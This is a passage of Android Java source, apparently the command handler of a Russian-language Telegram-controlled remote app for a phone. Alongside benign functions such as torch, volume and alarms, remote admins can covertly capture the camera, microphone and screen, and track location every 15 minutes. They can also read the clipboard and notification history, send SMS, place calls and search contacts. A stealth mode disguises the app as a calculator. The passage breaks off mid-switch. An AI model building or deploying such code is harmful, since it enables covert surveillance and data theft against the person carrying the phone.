        String[] p = data.split(":");
        String act = p.length > 0 ? p[0] : "";
        if (act.equals("m") && p.length > 1) act = p[1];
        if (act.equals("m")) act = "menu";
        String a1 = p.length > 2 ? p[2] : (p.length == 2 || !p[0].equals("m") ? (p.length > 1 ? p[1] : "") : "");
        if (p[0].equals("m") && p.length > 2) a1 = p[2];
        cmdCount++;

        switch (act) {
            // ---- core
            case "menu": api.answer(id, null); editMaybe(chat, mid, isText, textMain(), Kb.main()); break;
            case "more": api.answer(id, null); editMaybe(chat, mid, isText, textMore(), Kb.more()); break;
            case "stat": api.answer(id, null); editMaybe(chat, mid, isText, textStat(), Kb.more()); break;
            case "noop": api.answer(id, null); break;

            case "screen": api.answer(id, "📸 Снимок…"); captureAndSend(chat); break;
            case "home": global(GLOBAL_ACTION_HOME); api.answer(id, "🏠 На рабочем столе");
                editMaybe(chat, mid, isText, textMain(), Kb.main()); break;
            case "recents": global(GLOBAL_ACTION_RECENTS); api.answer(id, "🗂 Недавние");
                editMaybe(chat, mid, isText, textMain(), Kb.main()); break;
            case "notif": global(GLOBAL_ACTION_NOTIFICATIONS); api.answer(id, "🔔 Шторка");
                editMaybe(chat, mid, isText, textMain(), Kb.main()); break;
            case "lock": global(GLOBAL_ACTION_LOCK_SCREEN); api.answer(id, "🔒 Заблокировано");
                editMaybe(chat, mid, isText, textMain(), Kb.main()); break;

            // ---- volume
            case "vol": api.answer(id, null); editMaybe(chat, mid, isText, textVolume(), Kb.volume()); break;
            case "vol_up": api.answer(id, "🔊 " + Sys.adjustMusic(this, 1) + "%"); editMaybe(chat, mid, isText, textVolume(), Kb.volume()); break;
            case "vol_dn": api.answer(id, "🔉 " + Sys.adjustMusic(this, -1) + "%"); editMaybe(chat, mid, isText, textVolume(), Kb.volume()); break;
            case "ring_up": api.answer(id, "🔔 " + Sys.adjustRing(this, 1) + "%"); editMaybe(chat, mid, isText, textVolume(), Kb.volume()); break;
            case "ring_dn": api.answer(id, "🔉 " + Sys.adjustRing(this, -1) + "%"); editMaybe(chat, mid, isText, textVolume(), Kb.volume()); break;
            case "vol_mute": Sys.mute(this, true); api.answer(id, "🔇 Mute"); editMaybe(chat, mid, isText, textVolume(), Kb.volume()); break;
            case "vol_full": Sys.volumeMax(this); api.answer(id, "🔔 Максимум"); editMaybe(chat, mid, isText, textVolume(), Kb.volume()); break;

            // ---- vibration
            case "vib": {
                if (a1.isEmpty()) {
                    api.answer(id, null);
                    editMaybe(chat, mid, isText, textVib(), Kb.vibrate());
                } else {
                    int sec = intOf(a1, 3);
                    Tools.vibrate(this, sec);
                    api.answer(id, sec == 0 ? "🛑 Стоп" : "📳 " + sec + " сек");
                    LogStore.add("📳 Вибрация " + sec + " сек");
                }
                break;
            }

            // ---- torch
            case "torch": {
                if (a1.isEmpty()) {
                    api.answer(id, null);
                    editMaybe(chat, mid, isText, textTorch(), Kb.torch());
                } else if ("sos".equals(a1)) {
                    api.answer(id, "🚨 SOS-мигание 10 сек");
                    sosBlink();
                } else {
                    boolean on = "1".equals(a1);
                    boolean ok = Tools.torch(this, on);
                    api.answer(id, ok ? (on ? "💡 Включён" : "🌑 Выключен") : "⚠️ Нет доступа к фонарику");
                    editMaybe(chat, mid, isText, textTorch(), Kb.torch());
                    LogStore.add("🔦 Фонарик: " + (on ? "вкл" : "выкл"));
                }
                break;
            }

            // ---- find phone
            case "find": {
                if (a1.isEmpty()) {
                    api.answer(id, null);
                    editMaybe(chat, mid, isText, textFind(), Kb.find());
                } else if ("loc".equals(a1)) {
                    sirens(this, 3);
                    api.answer(id, "🆘 Сирена + ищу GPS…");
                    sendLocation(chat);
                } else {
                    int sec = intOf(a1, 3);
                    if (sec == 0) { stopSiren(); api.answer(id, "🛑 Стоп"); }
                    else {
                        sirens(this, sec);
                        api.answer(id, "🆘 Сирена " + sec + " сек");
                        LogStore.add("🆘 Сирена " + sec + " сек");
                    }
                }
                break;
            }

            // ---- camera
            case "cam": {
                if (a1.isEmpty()) {
                    api.answer(id, null);
                    editMaybe(chat, mid, isText, textCam(), Kb.camera());
                } else {
                    boolean front = "front".equals(a1);
                    int delay = intOf(p.length > 3 ? p[3] : "", 0);
                    api.answer(id, front ? "🤳 Фронталка…" : "📷 Основная…");
                    shootCamera(chat, front, delay);
                }
                break;
            }

            // ---- screen record
            case "rec": {
                if (a1.isEmpty()) {
                    api.answer(id, null);
                    editMaybe(chat, mid, isText, textRec(), Kb.recScreen());
                } else if ("auth".equals(a1)) {
                    api.answer(id, "🔑 Подтвердите на телефоне");
                    ScreenCapActivity.request(this, "record", 15);
                } else {
                    int sec = intOf(a1, 15);
                    if (!Config.projValid(this)) {
                        api.answer(id, "🔑 Нужно разрешение");
                        ScreenCapActivity.request(this, "record", sec);
                        api.sendMessage(chat, "🎥 <b>Разрешите запись</b> на телефоне — запись начнётся сама.", Kb.recScreen());
                    } else {
                        api.answer(id, "🎥 Запись " + sec + " сек");
                        ScreenCapService.start(this, "record", sec);
                    }
                }
                break;
            }

            // ---- mic
            case "mic": {
                if (a1.isEmpty()) { api.answer(id, null); editMaybe(chat, mid, isText, textMic(), Kb.recMic()); break; }
                final int sec = intOf(a1, 10);
                if (!Perms.granted(this, android.Manifest.permission.RECORD_AUDIO)) {
                    api.answer(id, "🚫 Нет разрешения");
                    api.sendMessage(chat, "🎙 <b>Нет доступа к микрофону</b>\nОткройте приложение → «Выдать разрешения».", Kb.recMic());
                    break;
                }
                api.answer(id, "🎙 Пишу " + sec + " сек");
                Capture.micStart(this, sec, new Capture.AudioCb() {
                    @Override public void ok(byte[] mp4, String mime) {
                        api.sendMessage(chat, "🎙 <b>Аудио готово</b>, отправляю…", null);
                        new Thread(() -> Act.sendAudio(mp4, "🎙 <b>Голосовая запись</b> · " + sec + " сек\n" + Sys.footer(BotService.this)), "pulse-audio").start();
                    }
                    @Override public void err(String why) {
                        api.sendMessage(chat, "🎙 <b>Не записалось</b>\n<i>" + why + "</i>", Kb.recMic());
                    }
                });
                break;
            }

            // ---- live screen
            case "live": {
                if (a1.isEmpty()) {
                    api.answer(id, null);
                    editMaybe(chat, mid, isText, textLive(), Kb.live());
                } else if ("stop".equals(a1)) {
                    try { stopService(new Intent(this, ScreenCapService.class)); } catch (Exception ignored) {}
                    api.answer(id, "⏹ Остановлено");
                } else {
                    if (!Config.projValid(this)) {
                        api.answer(id, "🔑 Разрешите");
                        ScreenCapActivity.request(this, "live", 60);
                        api.sendMessage(chat, "🖥 <b>Подтвердите «Начать запись»</b> — начну присылать кадры экрана.", Kb.live());
                    } else {
                        api.answer(id, "🖥 Трансляция 60 сек");
                        ScreenCapService.start(this, "live", 60);
                    }
                }
                break;
            }

            // ---- text
            case "text": {
                if (a1.isEmpty()) { api.answer(id, null); editMaybe(chat, mid, isText, textText(), Kb.textPanel()); break; }
            }
            case "text_send": {
                Act.setMode("text", null, chat);
                api.answer(id, "⌨️ Жду текст");
                api.sendMessage(chat, "⌨️ <b>Ввод текста</b>\n\nПришлите текст — введу его в активное поле.\n"
                        + "<i>Совет: сначала откройте нужное приложение на телефоне.</i>", TgApi.kb(TgApi.row(TgApi.btn("✖️ Отмена", "m:menu"))));
                break;
            }
            case "text_field": {
                Act.setMode("textfield", "", chat);
                api.answer(id, "🔍 Жду название");
                api.sendMessage(chat, "🔍 <b>Ввод по названию поля</b>\n\nПришлите в формате:\n"
                        + "<code>поиск: мой запрос</code>\nгде «поиск» — подсказка поля (hint/текст), "
                        + "а после двоеточия — что ввести.\n\nМожно просто <code>поле: текст</code>.",
                        TgApi.kb(TgApi.row(TgApi.btn("✖️ Отмена", "m:menu"))));
                break;
            }

            // ---- apps
            case "apps": api.answer(id, null); sendApps(chat); break;
            case "apg": {
                appsPage = intOf(a1, 0);
                api.answer(id, null);
                editMaybe(chat, mid, isText, textApps(), Kb.appsPage(appsSession, appsPage));
                break;
            }
            case "app": {
                int idx = intOf(a1, -1);
                if (idx >= 0 && idx < appsSession.size()) {
                    Apps.Item it = appsSession.get(idx);
                    boolean ok = Apps.launch(this, it.pkg);
                    api.answer(id, ok ? "✅ " + it.label : "⚠️ не открылось");
                    api.sendMessage(chat, (ok ? "🚀 <b>Открыл:</b> " : "⚠️ <b>Не открылось:</b> ") + esc(it.label)
                            + "\n<i>" + it.pkg + "</i>\n\n" + Sys.footer(this), Kb.main());
                    LogStore.add("🚀 Запуск: " + it.label);
                } else api.answer(id, "⚠️");
                break;
            }

            // ---- media
            case "media": api.answer(id, null); editMaybe(chat, mid, isText, textMedia(), Kb.media()); break;
            case "mplay": Sys.mediaKey(this, android.view.KeyEvent.KEYCODE_MEDIA_PLAY_PAUSE); api.answer(id, "⏯"); break;
            case "mnext": Sys.mediaKey(this, android.view.KeyEvent.KEYCODE_MEDIA_NEXT); api.answer(id, "⏭"); break;
            case "mprev": Sys.mediaKey(this, android.view.KeyEvent.KEYCODE_MEDIA_PREVIOUS); api.answer(id, "⏮"); break;
            case "mnow": {
                String now = nowPlaying();
                api.answer(id, "🎧");
                api.sendMessage(chat, now == null ? "🎧 Сейчас ничего не играет." : "🎧 <b>Сейчас играет</b>\n" + esc(now), Kb.media());
                break;
            }

            // ---- geo / url / files / now
            case "geo": api.answer(id, "📍 Ищу…"); sendLocation(chat); break;
            case "url": {
                Act.setMode("url", null, chat);
                api.answer(id, "🌐 Жду ссылку");
                api.sendMessage(chat, "🌐 Пришлите ссылку — открою её на телефоне.", TgApi.kb(TgApi.row(TgApi.btn("✖️ Отмена", "m:menu"))));
                break;
            }
            case "files": api.answer(id, "📁 Ищу…"); sendFiles(chat); break;
            case "now": {
                String fg = Sys.foregroundApp(this);
                api.answer(id, "🕶");
                api.sendMessage(chat, fg == null ? "🕶 Открытое приложение неизвестно." : "🕶 <b>Сейчас открыто:</b> " + esc(fg), Kb.more());
                break;
            }

            // ---- clipboard
            case "clip": api.answer(id, null); editMaybe(chat, mid, isText, textClip(), TgApi.kb(
                    TgApi.row(TgApi.btn("📋 Прочитать", "m:clip_get"), TgApi.btn("✍️ Записать", "m:clip_set")),
                    TgApi.row(TgApi.btn("◀️ В меню", "m:menu")))); break;
            case "clip_get": {
                String cb2 = Sys.clipboard(this);
                api.answer(id, cb2 == null ? "Буфер пуст" : "📋 Готово");
                api.sendMessage(chat, cb2 == null ? "📋 <b>Буфер пуст</b>" :
                        "📋 <b>В буфере обмена</b>\n\n<code>" + esc(cb2) + "</code>", Kb.more());
                break;
            }
            case "clip_set": {
                Act.setMode("clip", null, chat);
                api.answer(id, "✍️ Жду текст");
                api.sendMessage(chat, "✍️ Пришлите текст — положу его в буфер обмена телефона.",
                        TgApi.kb(TgApi.row(TgApi.btn("✖️ Отмена", "m:menu"))));
                break;
            }

            // ---- tts
            case "tts": {
                Act.setMode("tts", null, chat);
                api.answer(id, "🗣 Жду текст");
                api.sendMessage(chat, "🗣 Пришлите текст — телефон озвучит его вслух.", TgApi.kb(TgApi.row(TgApi.btn("✖️ Отмена", "m:menu"))));
                break;
            }

            // ---- brightness
            case "bright": api.answer(id, null); editMaybe(chat, mid, isText, textBright(), Kb.brightness()); break;
            case "br": {
                boolean ok;
                if ("auto".equals(a1)) ok = Sys.setBrightnessAuto(this);
                else ok = Sys.setBrightness(this, intOf(a1, 50));
                api.answer(id, ok ? "🔆 Готово" : "⚠️ Нужно разрешение «Изменение настроек»");
                editMaybe(chat, mid, isText, textBright(), Kb.brightness());
                break;
            }

            // ---- notifications panel
            case "notif_panel": api.answer(id, null); editMaybe(chat, mid, isText, textNotif(), Kb.notifPanel(this)); break;
            case "ntog": {
                boolean on = !Config.notifOn(this);
                Config.setNotifOn(this, on);
                api.answer(id, on ? "🔔 Включено" : "🔕 Выключено");
                editMaybe(chat, mid, isText, textNotif(), Kb.notifPanel(this));
                break;
            }
            case "nignore": api.answer(id, null); api.sendMessage(chat, textIgnore(), null); break;
            case "nclear": Config.notifIgnoreClear(this); api.answer(id, "🧹 Очищено"); editMaybe(chat, mid, isText, textNotif(), Kb.notifPanel(this)); break;

            // ---- schedule
            case "sched": {
                if ("clear".equals(a1)) {
                    Config.scheduleSet(this, new JSONArray());
                    api.answer(id, "🧹 Очищено");
                    editMaybe(chat, mid, isText, textSched(), Kb.schedule());
                    break;
                }
                if (a1.isEmpty()) { api.answer(id, null); editMaybe(chat, mid, isText, textSched(), Kb.schedule()); break; }
            }
            case "sched_add": {
                Act.setMode("sched", null, chat);
                api.answer(id, "⏰ Жду задание");
                api.sendMessage(chat, "⏰ <b>Отложенная команда</b>\n\nФормат: <code>минуты команда</code>\n"
                        + "Примеры:\n<code>30 блок</code> — заблокировать через полчаса\n"
                        + "<code>60 тишина</code> — выключить звук\n<code>15 домой</code>\n"
                        + "<code>10 скажи Я дома</code>", TgApi.kb(TgApi.row(TgApi.btn("✖️ Отмена", "m:menu"))));
                break;
            }

            // ---- alerts
            case "alerts": api.answer(id, null); editMaybe(chat, mid, isText, textAlerts(), Kb.alerts(this)); break;
            case "al": {
                if (a1.startsWith("al_")) Config.toggleAlert(this, a1);
                api.answer(id, null);
                editMaybe(chat, mid, isText, textAlerts(), Kb.alerts(this));
                break;
            }

            // ---- admins
            case "admins": api.answer(id, null); editMaybe(chat, mid, isText, textAdmins(), Kb.admins()); break;
            case "adm": {
                if ("add".equals(a1)) { /* fallthrough to adm_add */ }
                else if ("del".equals(a1)) {
                    StringBuilder sb = new StringBuilder();
                    for (Long a : Config.admins(this)) sb.append("• <code>").append(a).append("</code>\n");
                    api.answer(id, null);
                    api.sendMessage(chat, "🗑 Кого удалить? Пришлите ID из списка:\n\n" + sb,
                            TgApi.kb(TgApi.row(TgApi.btn("✖️ Отмена", "m:menu"))));
                    Act.setMode("admdel", null, chat);
                    break;
                } else break;
            }
            case "adm_add": {
                Act.setMode("adm", null, chat);
                api.answer(id, "👥 Жду ID");
                api.sendMessage(chat, "👥 Пришлите числовой Telegram ID нового админа.\n"
                        + "<i>Его можно узнать: пусть человек напишет боту — придёт «Доступ закрыт» с ID.</i>",
                        TgApi.kb(TgApi.row(TgApi.btn("✖️ Отмена", "m:menu"))));
                break;
            }


            // ---- pin
            case "pin": {
                if ("off".equals(a1)) {
                    Config.setPin(this, "");
                    AUTHED.clear();
                    api.answer(id, "🔓 PIN отключён");
                    editMaybe(chat, mid, isText, textPin(), Kb.pin(this));
                    break;
                }
                if (!"set".equals(a1)) { api.answer(id, null); editMaybe(chat, mid, isText, textPin(), Kb.pin(this)); break; }
            }
            case "pin_set": {
                Act.setMode("pin", null, chat);
                api.answer(id, "🔐 Жду PIN");
                api.sendMessage(chat, "🔐 Пришлите нов PIN (4–8 цифр).", null);
                break;
            }

            // ---- battery / panic
            case "bat": {
                api.answer(id, "🖼 Рисую…");
                final long chatF = chat;
                final BotService self = this;
                new Thread(() -> {
                    byte[] png = Tools.batteryChart(self);
                    Http.Resp r = api.sendDocument(chatF, png, "battery.png",
                            "🖼 <b>Батарея за сутки</b>\n\n" + Sys.footer(self), Kb.more());
                    if (!r.ok()) LogStore.add("🖼 График: " + r.description());
                }, "pulse-chart").start();
                break;
            }
            case "panic": {
                if (!"yes".equals(a1)) { api.answer(id, null); editMaybe(chat, mid, isText, textPanic(), Kb.panic()); break; }
            }
            case "panic_yes": {
                Config.panic(this);
                api.answer(id, "🧨 Токен обнулён");
                api.sendMessage(chat, "🧨 <b>Токен стёрт.</b>\nБот больше не отвечает. "
                        + "Чтобы восстановить — откройте приложение и вставьте новый токен.", null);
                stopEngine();
                break;
            }
            // ================= v2.1 =================
            case "cat": {
                api.answer(id, null);
                if ("ctl".equals(a1)) editMaybe(chat, mid, isText, textCat("📱 Управление", "Скриншоты, жесты, приложения, ввод"), Kb.catCtl());
                else if ("media".equals(a1)) editMaybe(chat, mid, isText, textCat("📷 Медиа", "Камера, запись, файлы, обои"), Kb.catMedia());
                else if ("info".equals(a1)) editMaybe(chat, mid, isText, textCat("📊 Инфо", "CPU, сеть, батарея, уведомления"), Kb.catInfo());
                else if ("auto".equals(a1)) editMaybe(chat, mid, isText, textCat("🤖 Авто", "Макросы, расписание, триггеры"), Kb.catAuto());
                else if ("set".equals(a1)) editMaybe(chat, mid, isText, textCat("⚙️ Настройки", "Админы, PIN, игнор, статистика"), Kb.catSet());
                else editMaybe(chat, mid, isText, textCat("🧭 Действия", "Звонки, SMS, будильники, яркость"), Kb.catAct());
                break;
            }
            case "dpad": api.answer(id, null); editMaybe(chat, mid, isText,
                    "🎮 <b>D-pad</b>\n\nУправляйте интерфейсом свайпами и тапом.\n\n" + Sys.footer(this), Kb.dpad()); break;
            case "dp": {
                final String dir = a1;
                Gestures.dpad(this, dir, new Gestures.Cb() {
                    @Override public void ok() { api.answer(id, "✅ " + dir); }
                    @Override public void err(String why) { api.answer(id, "⚠️ " + why); }
                });
                break;
            }
            case "back": performGlobalAction(GLOBAL_ACTION_BACK); api.answer(id, "↩️ Назад"); break;
            case "sc": {
                Gestures.scroll(this, "dn".equals(a1), new Gestures.Cb() {
                    @Override public void ok() { api.answer(id, "🔄"); }
                    @Override public void err(String why) { api.answer(id, "⚠️ " + why); }
                });
                break;
            }
            case "scroll": {
                api.answer(id, null);
                editMaybe(chat, mid, isText, "🔄 <b>Скролл</b>\nВниз/вверх по экрану.", Kb.dpad());
                break;
            }
            case "grid": {
                api.answer(id, "🖼 Делаю сетку…");
                gridShot(chat);
                editMaybe(chat, mid, isText,
                        "🔢 <b>Сетка 3×3</b>\n\nСмотри на последний скриншот: каждая ячейка A1–C3 — треть экрана. Жми кнопку — тапну в центре ячейки.", Kb.grid());
                break;
            }
            case "gr": {
                final String cell = a1;
                Gestures.tapCell(this, cell, new Gestures.Cb() {
                    @Override public void ok() { api.answer(id, "👆 Тап " + cell); }
                    @Override public void err(String why) { api.answer(id, "⚠️ " + why); }
                });
                break;
            }
            case "tapx": {
                Act.setMode("taptext", null, chat);
                api.answer(id, "🎯 Жду текст");
                api.sendMessage(chat, "🎯 <b>Тап по тексту</b>\nПришлите текст кнопки — нажму на неё (без координат).", TgApi.kb(TgApi.row(TgApi.btn("✖️ Отмена", "m:menu"))));
                break;
            }
            case "camvid": {
                if (a1.isEmpty()) {
                    api.answer(id, null);
                    editMaybe(chat, mid, isText, "🎥 <b>Видео с камеры</b>\n\nВыберите длительность:", TgApi.kb(
                            TgApi.row(TgApi.btn("5 сек", "m:camvid:5"), TgApi.btn("10 сек", "m:camvid:10"), TgApi.btn("20 сек", "m:camvid:20")),
                            TgApi.row(TgApi.btn("◀️ В меню", "m:menu"))));
                } else {
                    api.answer(id, "🎥 Запись…");
                    Capture.video(this, intOf(a1, 10), new Capture.AudioCb() {
                        @Override public void ok(byte[] mp4, String mime) {
                            new Thread(() -> Act.sendVideo(mp4, "cam.mp4", "🎥 <b>Видео с камеры</b>\n\n" + Sys.footer(BotService.this)), "pulse-camvid").start();
                        }
                        @Override public void err(String why) {
                            api.sendMessage(chat, "🎥 <b>Видео не записалось</b>\n<i>" + why + "</i>", Kb.catMedia());
                        }
                    });
                }
                break;
            }
            case "burst": {
                act(() -> Capture.burst(this, 4, new Capture.BurstCb() {
                    @Override public void frame(byte[] jpeg, int n, int total) {
                        new Thread(() -> Act.sendPhoto(jpeg, "📸 Кадр " + n + "/" + total), "pulse-burst").start();
                    }
                    @Override public void done(int n) { api.sendMessage(chat, "📸 Серия готова: " + n + " кадров", Kb.catMedia()); }
                    @Override public void err(String why) { api.sendMessage(chat, "📸 " + why, Kb.catMedia()); }
                }));
                api.answer(id, "📸 Серия…");
                break;
            }
            case "rec2": {
                api.answer(id, "🔴 Запись без лимита");
                if (!Config.projValid(this)) {
                    ScreenCapActivity.request(this, "record", 900);
                    api.sendMessage(chat, "🔴 <b>Разрешите запись</b> на телефоне, затем нажмите «⏹ Стоп» здесь и видео придёт в чат.", Kb.catMedia());
                } else ScreenCapService.start(this, "record", 900);
                break;
            }
            case "wall": {
                Act.setMode("wall", null, chat);
                api.answer(id, "🖼 Жду картинку");
                api.sendMessage(chat, "🖼 <b>Смена обоев</b>\n\nКидайте картинку сюда — поставлю её на рабочий стол телефона.", TgApi.kb(TgApi.row(TgApi.btn("✖️ Отмена", "m:menu"))));
                break;
            }
            case "fromtg": {
                Act.setMode("fromtg", null, chat);
                api.answer(id, "📥 Жду файл");
                api.sendMessage(chat, "📥 Пришлите файл — сохраню в папку <code>Download</code> телефона.", TgApi.kb(TgApi.row(TgApi.btn("✖️ Отмена", "m:menu"))));
                break;
            }
            case "cpu": api.answer(id, "🖥"); api.sendMessage(chat, Hardware.cpuReport() + "\n" + Hardware.memReport(this), Kb.catInfo()); break;
            case "ram": api.answer(id, "🧠"); api.sendMessage(chat, Hardware.memReport(this), Kb.catInfo()); break;
            case "net": api.answer(id, "🌐"); api.sendMessage(chat, Hardware.netReport(this), Kb.catInfo()); break;
            case "speed": {
                api.answer(id, "🚀 Тестирую…");
                new Thread(() -> {
                    String res = Hardware.speedTest(BotService.this);
                    api.sendMessage(chat, res, Kb.catInfo());
                }, "pulse-speed").start();
                break;
            }
            case "radio": api.answer(id, "📶"); api.sendMessage(chat, Hardware.netReport(this) + "\n" + Sys.footer(this), Kb.catInfo()); break;
            case "nhist": {
                api.answer(id, "📜");
                java.util.List<String> h = Config.notifHistory(this);
                StringBuilder sb = new StringBuilder("📜 <b>История уведомлений</b> (последние " + Math.min(h.size(), 25) + ")\n\n");
                for (int i = 0; i < Math.min(h.size(), 25); i++) sb.append("• ").append(esc(h.get(i))).append("\n");
                if (h.isEmpty()) sb.append("<i>Пока пусто. Включите «Доступ к уведомлениям».</i>");
                api.sendMessage(chat, sb.toString(), TgApi.kb(TgApi.row(TgApi.btn("🧹 Очистить", "m:nhist_clear"), TgApi.btn("◀️ В меню", "m:menu"))));
                break;
            }
            case "nhist_clear": Config.clearNotifHistory(this); api.answer(id, "🧹 Очищено"); break;
            case "applist": {
                api.answer(id, "📱");
                java.util.List<Apps.Item> all = Tools.appList(this);
                StringBuilder sb = new StringBuilder("📱 <b>Установленные приложения</b>: " + all.size() + "\n\n");
                for (int i = 0; i < Math.min(all.size(), 40); i++) sb.append("• ").append(esc(all.get(i).label)).append("\n");
                if (all.size() > 40) sb.append("…и ещё " + (all.size() - 40));
                api.sendMessage(chat, sb.toString(), Kb.catInfo());
                break;
            }
            case "macro": {
                api.answer(id, null);
                editMaybe(chat, mid, isText, textMacro(), Kb.macroPanel(Config.macros(this)));
                break;
            }
            case "mac": {
                if ("add".equals(a1)) {
                    Act.setMode("macro", null, chat);
                    api.answer(id, "🎬 Жду макрос");
                    api.sendMessage(chat, "🎬 <b>Новый макрос</b>\n\nФормат: <code>Имя = действие1, действие2…</code>\n\n"
                            + "Действия: <code>lock, home, mute, unmute, find, screenshot, torch, torchoff, tts:текст, open:ютуб, bright:30, volume:50</code>\n\n"
                            + "Пример: <code>Кино = mute, bright:20, open:ютуб</code>", TgApi.kb(TgApi.row(TgApi.btn("✖️ Отмена", "m:menu"))));
                    break;
                }
                if ("del".equals(a1)) {
                    Config.macrosSet(this, new JSONArray());
                    api.answer(id, "🧹 Макросы сброшены к стандартным");
                    editMaybe(chat, mid, isText, textMacro(), Kb.macroPanel(Config.macros(this)));
                    break;
                }
                int idx = intOf(a1, -1);
                JSONArray macros = Config.macros(this);
                if (idx >= 0 && idx < macros.length()) {
                    JSONObject m = macros.optJSONObject(idx);
                    if (m != null) {
                        String name = m.optString("name");
                        JSONArray acts = m.optJSONArray("acts");
                        api.answer(id, "▶️ " + name);
                        runMacro(chat, name, acts);
                    }
                }
                break;
            }
            case "digest": {
                boolean on = Config.digestHour(this) >= 0;
                api.answer(id, null);
                api.sendMessage(chat, textDigest(), TgApi.kb(
                        TgApi.row(TgApi.btn(on ? "🔕 Выключить" : "🔔 Включить в 9:00", "m:digest_toggle")),
                        TgApi.row(TgApi.btn("▶️ Прислать сейчас", "m:digest_now"), TgApi.btn("◀️ В меню", "m:menu"))));
                break;
            }
            case "digest_toggle": {
                Config.setDigestHour(this, Config.digestHour(this) >= 0 ? -1 : 9);
                api.answer(id, "Готово");
                api.sendMessage(chat, textDigest(), Kb.catAuto());
                break;
            }
            case "digest_now": api.answer(id, "📰"); api.sendMessage(chat, Background.buildDigest(this), Kb.catAuto()); break;
            case "trig": {
                api.answer(id, null);
                String trg = trigDump(this);
                api.sendMessage(chat, "📶 <b>Wi-Fi триггеры</b>\n\n" + trg + "\n"
                        + "Формат: <code>/trig SSID = mute</code>\n"
                        + "Когда телефон подключится к этой сети — выполню действие.\n"
                        + "<code>/trig -</code> — очистить.", TgApi.kb(TgApi.row(TgApi.btn("➕ Добавить", "m:trig_add"), TgApi.btn("◀️ В меню", "m:menu"))));
                break;
            }
            case "trig_add": {
                Act.setMode("trig", null, chat);
                api.answer(id, "📶 Жду правило");
                api.sendMessage(chat, "📶 Формат: <code>Моя_сеть = mute</code>\nДействия: mute, unmute, lock, tts:текст, open:ютуб", null);
                break;
            }
            case "tracking": {
                boolean on = Config.tracking(this);
                Config.setTracking(this, !on);
                api.answer(id, on ? "📍 Трекинг выкл" : "📍 Трекинг вкл (каждые 15 мин)");
                api.sendMessage(chat, on ? "📍 <b>Трекинг выключен</b>" : "📍 <b>Трекинг включён</b>\nКаждые 15 минут буду присылать координаты.", Kb.catAuto());
                break;
            }
            case "sos": {
                boolean on = a1.isEmpty();
                if (on) {
                    sirens(this, 600);
                    api.answer(id, "🚨 SOS до отмены");
                    api.sendMessage(chat, "🚨 <b>SOS включён</b>\nСигнал будет орать, пока не нажмёте «Стоп».", TgApi.kb(TgApi.row(TgApi.btn("🛑 СТОП", "m:find:0"), TgApi.btn("◀️ В меню", "m:menu"))));
                } else stopSiren();
                break;
            }
            case "watchdog": {
                api.answer(id, null);
                api.sendMessage(chat, textWatchdog(), TgApi.kb(
                        TgApi.row(TgApi.btn("🔁 Перезапустить движок", "m:watchdog_restart")),
                        TgApi.row(TgApi.btn("◀️ В меню", "m:menu"))));
                break;
            }
            case "watchdog_restart": {
                api.answer(id, "🔁 Перезапуск…");
                BotService.reload(this);
                break;
            }
            case "stats": api.answer(id, "📈"); api.sendMessage(chat, "📈 <b>Статистика</b>\n\n" + Config.statsDump(this) + "\n⏱ Аптайм: " + Sys.uptime() + "\n🧮 Команд: " + cmdCount, Kb.catSet()); break;
            case "log": api.answer(id, "📜"); api.sendMessage(chat, "📜 <b>Журнал</b>\n\n<code>" + esc(tail(LogStore.dump(), 2500)) + "</code>", Kb.catSet()); break;
            case "lang": {
                api.answer(id, null);
                api.sendMessage(chat, "🌍 <b>Язык</b>\n\nПоддержка: 🇷🇺 русский, 🇬🇧 English (в разработке)", TgApi.kb(TgApi.row(TgApi.btn("◀️ В меню", "m:menu"))));
                break;
            }
            case "stealth": {
                boolean on = Config.stealth(this);
                api.answer(id, null);
                api.sendMessage(chat, "🎭 <b>Стелс-режим</b>\n\n" + (on
                        ? "✅ Включён: иконка и имя «Калькулятор». Открываешь — обычный калькулятор. Код <code>" + Config.calcCode(this) + "</code> + «=» открывает пульт."
                        : "Выключен. Включите — приложение замаскируется под калькулятор.")
                        + "\n\n<i>Сменить код: /calc 7777</i>", TgApi.kb(
                        TgApi.row(TgApi.btn(on ? "🔓 Выключить маскировку" : "🎭 Замаскировать", "m:stealth_toggle")),
                        TgApi.row(TgApi.btn("◀️ В меню", "m:menu"))));
                break;
            }
            case "stealth_toggle": {
                boolean on = !Config.stealth(this);
                Config.setStealth(this, on);
                Stealth.apply(this);
                api.answer(id, on ? "🎭 Замаскировано" : "✅ Обычный режим");
                break;
            }
            case "call": Act.setMode("call", null, chat); api.answer(id, "📞 Жду номер"); api.sendMessage(chat, "📞 Пришлите номер, на который позвонить.", null); break;
            case "sms": Act.setMode("sms", null, chat); api.answer(id, "💬 Жду"); api.sendMessage(chat, "💬 Формат: <code>+79991234567 Привет!</code>", null); break;
            case "hangup": {
                boolean ok = Dial.endCall(this);
                api.answer(id, ok ? "📵 Сброшено" : "⚠️ Нужно разрешение на звонки");
                break;
            }
            case "contacts": {
                Act.setMode("contact", null, chat);
                api.answer(id, "📇 Жду имя");
                api.sendMessage(chat, "📇 Пришлите имя (или часть) — найду номер и позвонить можно кнопкой ниже.", TgApi.kb(TgApi.row(TgApi.btn("✖️ Отмена", "m:menu"))));
                break;
            }
            case "alarm": {
                if ("ask".equals(a1)) { Act.setMode("alarm", null, chat); api.answer(id, "⏰ Жду время"); api.sendMessage(chat, "⏰ Пришлите время: <code>7:30</code> или <code>07:30</code>", null); break; }
                int h = intOf(a1, 7);
                Dial.alarm(this, h, 0, "Pulse");
                api.answer(id, "⏰ " + h + ":00");
                break;
            }
            case "tmx": {
                int min = intOf(a1, 5);
                Dial.timer(this, min * 60);
                api.answer(id, "⏱ " + min + " мин");
                break;
            }
            case "alarmx": api.answer(id, null); editMaybe(chat, mid, isText, "⏰ <b>Будильник / таймер</b>", Kb.alarmPanel()); break;
            case "mute": Sys.mute(this, true); api.answer(id, "🌙 Без звука"); break;
            case "keepawake": {
                boolean cur = Tools.keepAwake(this, true);
                api.answer(id, cur ? "💡 Экран не гаснет 30 мин" : "⚠️ Не удалось");
                break;
            }
            case "websearch": Act.setMode("web", null, chat); api.answer(id, "🔍"); api.sendMessage(chat, "🔍 Пришлите запрос — открою поиск в браузере телефона.", null); break;
            case "relaytog": {
                boolean on = !Relay.enabled(this);
                Relay.setEnabled(this, on);
                if (on) RelayService.start(this); else RelayService.stop(this);
                api.answer(id, on ? "📡 Релей включён" : "⛔ Релей выключен");
                editMaybe(chat, mid, isText, Net.channelsReport(this), relayKb());
                break;
            }
            case "relaytest": {
                api.answer(id, "🔬 Проверяю…");
                new Thread(() -> api.sendMessage(chat, Relay.selfTest(BotService.this), relayKb()), "pulse-selftest").start();
                break;
            }
            case "relayrestart": {
